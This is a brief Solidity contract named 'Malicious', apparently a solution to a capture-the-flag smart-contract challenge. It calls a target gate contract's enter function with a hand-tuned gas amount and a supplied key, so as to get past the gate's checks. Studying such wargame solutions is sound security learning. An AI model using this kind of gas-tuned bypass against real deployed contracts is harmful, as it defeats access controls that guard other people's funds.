// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {

  address public gateAddress;

  constructor(address gateAddress_) {
      gateAddress = gateAddress_;
  }

  function enter(bytes8 _gateKey) public returns(bool, bytes memory) {
    (bool success, bytes memory data) = gateAddress.call{gas: 82164}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    require(success == true);
    return (success, data);
  }
}
